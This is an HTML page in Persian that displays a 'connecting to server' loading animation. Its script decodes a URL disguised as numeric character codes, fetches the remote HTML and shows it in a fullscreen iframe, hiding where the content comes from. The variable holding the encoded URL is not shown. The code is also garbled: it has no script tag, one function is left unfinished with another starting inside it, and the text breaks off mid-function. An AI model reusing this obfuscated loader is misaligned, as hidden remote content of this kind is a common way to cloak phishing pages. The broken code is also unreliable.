<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>در حال اتصال...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            width: 100%;
            height: 100vh;
            background: radial-gradient(ellipse at center, #0a0f1e 0%, #03060c 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
        }
        .loader-container {
            text-align: center;
            position: relative;
            z-index: 20;
        }
        .neon-ring {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            position: relative;
        }
        .neon-ring::before {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00ffcc, #ff00cc, #00ffcc);
            animation: rotateNeon 2s linear infinite;
            filter: blur(15px);
            opacity: 0.7;
        }
        .neon-ring::after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 50%;
            background: #0a0f1e;
        }
        .spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            border: 3px solid rgba(0,255,200,0.3);
            border-top: 3px solid #00ffcc;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            z-index: 2;
        }
        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }
        @keyframes rotateNeon {
            to { transform: rotate(360deg); }
        }
        .status-text {
            color: #00ffcc;
            font-size: 22px;
            letter-spacing: 3px;
            margin-top: 20px;
            text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%,100% { opacity: 0.7; text-shadow: 0 0 5px #00ffcc; }
            50% { opacity: 1; text-shadow: 0 0 20px #00ffcc, 0 0 30px #00ffcc; }
        }
        .sub-text {
            color: #6688aa;
            font-size: 13px;
            margin-top: 15px;
            letter-spacing: 1px;
        }
        .progress-bar {
            width: 250px;
            height: 2px;
            background: rgba(0,255,200,0.2);
            margin: 30px auto 0;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00ffcc, #ff00cc);
            animation: fillProgress 2.5s ease-out forwards;
        }
        @keyframes fillProgress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .fullscreen-frame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 10;
            display: none;
            background: #000;
        }
        .dots {
            display: inline-block;
            width: 40px;
            text-align: left;
        }
    </style>
</head>
<body>

<div class="loader-container" id="loader">
    <div class="neon-ring">
        <div class="spinner"></div>
    </div>
    <div class="status-text">
        در حال اتصال به سرور<span class="dots" id="dots">...</span>
    </div>
    <div class="sub-text">لطفاً چند لحظه صبر کنید</div>
    <div class="progress-bar">
        <div class="progress-fill"></div>
    </div>
</div>

<iframe id="contentFrame" class="fullscreen-frame" src="about:blank"></iframe>

    let dotCount = 0;
    setInterval(() => {

    function decode(encoded) {
        let parts = encoded.split('.');
        if(parts[0] !== "8426") return null;
        parts = parts.slice(1, -2);
        let result = "";
        for(let i = 0; i < parts.length; i++) {
            result += String.fromCharCode(parseInt(parts[i]));
        }
        return result;
    }
    
    async function loadContent() {
        let link = decode(fullCode);
        
        if(!link) {
            loaderDiv.innerHTML = '<div class="neon-ring"><div class="spinner"></div></div><div class="status-text">خطا در اتصال</div><div class="sub-text">لطفاً مجدداً تلاش کنید</div>';
            return;
        }
        
        try {
            const response = await fetch(link);
            const html = await response.text();
            
            setTimeout(() => {
                contentFrame.srcdoc = html;
                loaderDiv.style.opacity = "0";
                setTimeout(() => {
                    loaderDiv.style.display = "none";
                    contentFrame.style.display = "block";
                }, 500);
            }, 1000);
